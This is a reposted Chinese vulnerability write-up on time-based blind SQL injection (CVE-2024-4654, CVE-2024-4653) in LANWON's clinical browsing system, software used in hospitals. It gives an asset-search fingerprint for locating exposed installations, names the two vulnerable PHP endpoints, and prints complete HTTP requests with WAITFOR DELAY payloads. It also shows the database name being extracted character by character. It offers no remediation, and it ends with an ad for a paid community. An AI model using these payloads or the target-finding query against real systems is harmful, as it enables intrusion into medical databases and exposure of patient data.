---
title: 某浏览系统存在延时注入
url: https://buaq.net/go-240267.html
source: unSafe.sh - 不安全
date: 2024-05-20
fetch_date: 2025-10-06T16:48:52.252954
---

# 某浏览系统存在延时注入

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/b41cb67d932d973cb6e31c6d557f78d3.jpg)

某浏览系统存在延时注入

漏洞详情蓝网科技临床浏览系统是一个专门用于医疗行业的软件系统，主要用于医生、护士和其他医疗专业人员在临床工作中进行信息浏览、查询和管理。蓝网科技有限公司临床浏览系统存在前端SQL注入漏洞。漏洞版本 版
*2024-5-19 20:49:26
Author: [mp.weixin.qq.com(查看原文)](/jump-240267.htm)
阅读量:33
收藏*

---

**漏洞详情**

`蓝网科技临床浏览系统是一个专门用于医疗行业的软件系统，主要用于医生、护士和其他医疗专业人员在临床工作中进行信息浏览、查询和管理。`

`蓝网科技有限公司临床浏览系统存在前端SQL注入漏洞。`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReRVQWJdYMMjx0oZpA8lHnDDaVMnXibLwfnrJdRC8EpDCe8FsNP16BwdA/640?wx_fmt=png)

**漏洞版本**

`版本：1.2.1`

**资产测绘**

```
app="LANWON-临床浏览系统"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReXPruQQ4lcLMYrW972b48mlnyE1NDuQlJTg0036f5rEicHStuibqJI32A/640?wx_fmt=png)

**漏洞代码存在位置**

```
/xds/outIndex.php #sql延时注入
/xds/cloudInterface.php #sql延时注入
```

**漏洞分析**

**`0x01`** **`临床浏览系统/xds/outIndex.php sql延时注入`** **`CVE-2024-4654`**

`漏洞代码存在位置 /xds/outIndex.php`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReFIQRDIqJCkdEbswjKma0ns03EVEoKXGcBTS7WsowhxAEth3uGCsHqw/640?wx_fmt=png)

`由于这里的SQL注入是基于时间的盲注，因此需要通过ASSCII确定数据库名称。POC如下，这里通过截断判断数据库中的第一个位置是 X`

`payload：`

```
GET /xds/outIndex.php?appuser=1&name=1%22%27;if%20(ascii(substring(db_name(),1,1)))=88%20WAITFOR%20DELAY%20%270:0:5%27--%20q HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=t0plbc89dh3spdkqr54g8frbn6Upgrade-Insecure-Requests: 1X-Forwarded-For:
```

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReuNcuPU2uSTxvdky1QEoJfIhT5HoMvAn32zl1icYyuKWPt0tiauz1V47g/640?wx_fmt=png)`

`在这里，通过截断判断数据库中的第二位是 D`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABRez5H0kwVp7Ty1MEAcHTC5UraeWPYcsnbnySMvzdbXMNv6cia4orsPMSQ/640?wx_fmt=png)`

`通过截断判断数据库中的第三个数字是 S`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABRez4cU4d4GibKNu9iaialf9rEDHFg86q81SZhCtSH9icNgictbUboy0OKhRxA/640?wx_fmt=png)`

`通过截断判断数据库的第四位是``7`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReG1McyZicWCuxmLA6JsdX8eTiaibLJufujZ98V3haAx6cswrSzbjUydsibQ/640?wx_fmt=png)`

`通过截断判断数据库的第五位是``0`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReRaplqgl6MMVPLO9B1hX3Dl5bBzwGrOIHDZIjTjMvvuhr5xyyWQ9NEQ/640?wx_fmt=png)`

`通过截断判断数据库中的第六位数字为T`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReuyFdgebibg9EQxlKiaA6SSlQ6icSdO0oesyibOIYnfuqBdfryIiaGG15kwA/640?wx_fmt=png)

**`最终通过延迟注入确定数据库名称为：XDS70T`**

**`0x02 临床浏览系统 /xds/cloudInterface.php sql延时注入 CVE-2024-4653`**

`漏洞代码存在位置` `/xds/cloudInterface.php`

`与上面同样，基于时间的盲注，因此需要通过ASSCII确定数据库名称。POC如下这里，通过截断判断数据库中的第一个位置是 X`

```
GET /xds/cloudInterface.php?INSTI_CODE=1%27);if%20(ascii(substring(db_name(),1,1)))=88%20WAITFOR%20DELAY%20%270:0:5%27--%20q HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=9ppbslm6ue630ge9ptrdprb0d2Upgrade-Insecure-Requests: 1X-Forwarded-For:
```

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReibUyd5j0zu97w6SBT6bqib1BvWk2SRmrkhBA3sAjEZkkdYo8C8apxjEQ/640?wx_fmt=png)`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReGusibFqt8vVg8CAGovPJBp0MPju5NWatYO10b0Yic8Rok4TibT7Kibc11w/640?wx_fmt=png)`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABRerB0k6SgJ397ZVIGbq8cWBicsM1s6ssPEJiaicWvULiah9RfHEBFBRibNH5A/640?wx_fmt=png)`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReaxZlWzicLDM9PRiakBPB7qB0jTO0icyWWz0DYypz7p7qUBw0bPibXpnh3g/640?wx_fmt=png)`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABRe9UdMxl1v4kJwW3PH7qnJkV48ueDsLibqiaoCB5Xicpz3s3t49XL01WwDQ/640?wx_fmt=png)`

`![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVY8nFoxoQGf2NVHLXVABReIgI2bhfxmNudvWnG6m6NqK5hOrdLmrltj4fz1umpHgQu8eOoeHJ4lA/640?wx_fmt=png)最终通过6次延迟注入确定数据库名称为：XDS70T`

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款
前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

文章来源: https://mp.weixin.qq.com/s?\_\_biz=MzIzMTIzNTM0MA==&mid=2247494659&idx=1&sn=415537ced7f184a9d2a87780c591ad66&chksm=e8a5e660dfd26f76d6767fadb58f9a3121d4a8c79d7ddf2962e0f2663b857303884526728550&scene=58&subscene=0#rd
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)